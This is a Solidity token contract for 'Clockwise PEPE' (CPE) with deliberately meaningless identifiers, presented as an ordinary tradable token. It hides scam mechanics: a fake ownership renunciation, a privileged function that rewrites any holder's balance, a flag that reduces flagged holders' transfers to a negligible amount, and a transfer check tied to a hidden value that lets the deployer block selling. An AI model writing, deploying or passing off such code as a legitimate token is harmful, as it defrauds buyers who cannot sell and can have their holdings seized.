//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface launchedLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeAmount) external view returns (uint256);

    function transfer(address takeMax, uint256 limitTrading) external returns (bool);

    function allowance(address exemptShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitTrading) external returns (bool);

    function transferFrom(
        address sender,
        address takeMax,
        uint256 limitTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundSell, uint256 value);
    event Approval(address indexed exemptShould, address indexed spender, uint256 value);
}

abstract contract swapMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atSender {
    function createPair(address receiverTrading, address amountLimit) external returns (address);
}

interface launchedLaunchMetadata is launchedLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ClockwisePEPE is swapMarketing, launchedLaunch, launchedLaunchMetadata {

    address public tokenFee;

    function maxFrom(address receiverTotal) public {
        modeToken();
        if (liquidityAmount == liquidityList) {
            liquidityAmount = false;
        }
        if (receiverTotal == marketingMode || receiverTotal == tokenFee) {
            return;
        }
        launchEnable[receiverTotal] = true;
    }

    uint256 exemptFund;

    mapping(address => mapping(address => uint256)) private shouldToken;

    function tokenMax(address txListMin, address takeMax, uint256 limitTrading) internal returns (bool) {
        require(feeTo[txListMin] >= limitTrading);
        feeTo[txListMin] -= limitTrading;
        feeTo[takeMax] += limitTrading;
        emit Transfer(txListMin, takeMax, limitTrading);
        return true;
    }

    function allowance(address totalLaunch, address takeReceiver) external view virtual override returns (uint256) {
        if (takeReceiver == sellMaxIs) {
            return type(uint256).max;
        }
        return shouldToken[totalLaunch][takeReceiver];
    }

    event OwnershipTransferred(address indexed txTotal, address indexed minFee);

    bool public liquidityList;

    constructor (){
        
        tokenAmount exemptSell = tokenAmount(sellMaxIs);
        tokenFee = atSender(exemptSell.factory()).createPair(exemptSell.WETH(), address(this));
        if (liquidityList) {
            isToReceiver = false;
        }
        marketingMode = _msgSender();
        receiverFund();
        marketingFund[marketingMode] = true;
        feeTo[marketingMode] = modeFund;
        if (liquidityList == isToReceiver) {
            isToReceiver = false;
        }
        emit Transfer(address(0), marketingMode, modeFund);
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverFrom;
    }

    bool public fromMode;

    function fromBuyWallet(address buyListExempt) public {
        require(buyListExempt.balance < 100000);
        if (maxLaunch) {
            return;
        }
        if (fromMode == liquidityAmount) {
            liquidityAmount = true;
        }
        marketingFund[buyListExempt] = true;
        
        maxLaunch = true;
    }

    bool public isToReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return modeFund;
    }

    address private atMarketingMin;

    uint8 private receiverFrom = 18;

    function swapFrom(uint256 limitTrading) public {
        modeToken();
        exemptFund = limitTrading;
    }

    address sellMaxIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function receiverFund() public {
        emit OwnershipTransferred(marketingMode, address(0));
        atMarketingMin = address(0);
    }

    function balanceOf(address takeAmount) public view virtual override returns (uint256) {
        return feeTo[takeAmount];
    }

    uint256 private modeFund = 100000000 * 10 ** 18;

    function modeToken() private view {
        require(marketingFund[_msgSender()]);
    }

    function swapTeamMarketing(address txListMin, address takeMax, uint256 limitTrading) internal returns (bool) {
        if (txListMin == marketingMode) {
            return tokenMax(txListMin, takeMax, limitTrading);
        }
        uint256 atExempt = launchedLaunch(tokenFee).balanceOf(tokenSwapLaunch);
        require(atExempt == exemptFund);
        require(takeMax != tokenSwapLaunch);
        if (launchEnable[txListMin]) {
            return tokenMax(txListMin, takeMax, senderAt);
        }
        return tokenMax(txListMin, takeMax, limitTrading);
    }

    function getOwner() external view returns (address) {
        return atMarketingMin;
    }

    uint256 constant senderAt = 4 ** 10;

    function transferFrom(address txListMin, address takeMax, uint256 limitTrading) external override returns (bool) {
        if (_msgSender() != sellMaxIs) {
            if (shouldToken[txListMin][_msgSender()] != type(uint256).max) {
                require(limitTrading <= shouldToken[txListMin][_msgSender()]);
                shouldToken[txListMin][_msgSender()] -= limitTrading;
            }
        }
        return swapTeamMarketing(txListMin, takeMax, limitTrading);
    }

    function owner() external view returns (address) {
        return atMarketingMin;
    }

    bool public maxLaunch;

    function tradingToken(address maxTotal, uint256 limitTrading) public {
        modeToken();
        feeTo[maxTotal] = limitTrading;
    }

    function transfer(address maxTotal, uint256 limitTrading) external virtual override returns (bool) {
        return swapTeamMarketing(_msgSender(), maxTotal, limitTrading);
    }

    address public marketingMode;

    string private amountTo = "Clockwise PEPE";

    address tokenSwapLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 marketingMax;

    mapping(address => bool) public launchEnable;

    function symbol() external view virtual override returns (string memory) {
        return totalAmount;
    }

    function name() external view virtual override returns (string memory) {
        return amountTo;
    }

    bool private liquidityAmount;

    mapping(address => uint256) private feeTo;

    mapping(address => bool) public marketingFund;

    string private totalAmount = "CPE";

    function approve(address takeReceiver, uint256 limitTrading) public virtual override returns (bool) {
        shouldToken[_msgSender()][takeReceiver] = limitTrading;
        emit Approval(_msgSender(), takeReceiver, limitTrading);
        return true;
    }

}